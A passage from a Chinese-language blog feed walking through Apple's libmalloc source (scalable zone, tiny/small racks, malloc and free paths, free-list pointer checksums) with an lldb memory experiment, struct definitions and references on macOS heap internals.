*)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
